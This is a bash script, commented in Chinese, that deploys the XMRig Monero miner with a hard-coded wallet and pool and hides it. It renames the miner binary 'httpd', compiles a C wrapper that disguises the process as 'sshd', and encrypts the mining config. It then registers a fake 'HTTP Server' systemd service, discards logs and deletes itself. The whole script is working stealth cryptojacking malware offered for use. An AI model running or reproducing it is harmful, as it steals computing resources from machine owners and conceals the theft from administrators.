#!/bin/bash

# 隐藏 xmrig 进程及其特征的一键部署脚本

# 确保脚本以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 检查依赖，包括 openssl 用于加密
for cmd in curl tar gcc systemctl openssl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请先安装" 1>&2
        exit 1
    fi
done

# 用户输入矿池 URL 和钱包地址
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入采矿服务器密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}
read -s -p "请输入配置文件加密密码: " encrypt_pass
echo

# 创建目录
mkdir -p /opt/xmrig /etc/systemd/conf.d || { echo "创建目录失败" 1>&2; exit 1; }

# 下载并安装 xmrig
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/xmrig || { echo "下载或解压失败" 1>&2; exit 1; }
mv /opt/xmrig/xmrig-6.22.2/xmrig /opt/xmrig/httpd || { echo "移动文件失败" 1>&2; exit 1; }
chmod +x /opt/xmrig/httpd
rm -rf /opt/xmrig/xmrig-6.22.2

# 创建 wrapper 以伪装进程名
cat > /opt/xmrig/wrapper.c <<EOF
#include <sys/prctl.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "sshd", 0, 0, 0);
    execv("/opt/xmrig/httpd", argv);
    return 0;
}
EOF
gcc -o /opt/xmrig/wrapper /opt/xmrig/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
rm /opt/xmrig/wrapper.c

# 生成明文配置文件
config_file="/etc/systemd/conf.d/httpd.conf.plain"
encrypted_file="/etc/systemd/conf.d/httpd.conf.enc"
cat > "$config_file" <<EOF
{
    "pools": [
        {
            "url": "$pool_url",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false,
    "threads": 1
}
EOF

# 加密配置文件
openssl enc -aes-256-cbc -salt -in "$config_file" -out "$encrypted_file" -k "$encrypt_pass" || { echo "加密配置文件失败" 1>&2; exit 1; }
rm "$config_file"

# 创建解密并运行的启动脚本
cat > /opt/xmrig/start.sh <<EOF
#!/bin/bash
CONFIG="/etc/systemd/conf.d/httpd.conf.enc"
TEMP_CONFIG="/tmp/httpd.conf.\$\$"
trap 'rm -f \$TEMP_CONFIG' EXIT
openssl enc -aes-256-cbc -d -in \$CONFIG -out \$TEMP_CONFIG -k "$encrypt_pass" || exit 1
/opt/xmrig/wrapper --config=\$TEMP_CONFIG --no-color --log-file=/dev/null
EOF
chmod +x /opt/xmrig/start.sh

# 创建用户和组
groupadd -r httpd 2>/dev/null || true
useradd -r -s /bin/false -g httpd httpd || { echo "创建用户失败" 1>&2; exit 1; }

# 创建 systemd 服务文件，限制单进程
cat > /etc/systemd/system/httpd.service <<EOF
[Unit]
Description=HTTP Server
After=network.target

[Service]
User=httpd
Group=httpd
ExecStart=/opt/xmrig/start.sh
Restart=always
LimitNPROC=1

[Install]
WantedBy=multi-user.target
EOF

# 启用并启动服务
systemctl daemon-reload
systemctl enable httpd.service
systemctl start httpd.service || { echo "服务启动失败" 1>&2; exit 1; }

# 删除脚本自身
rm -- "$0"
echo "部署完成！"
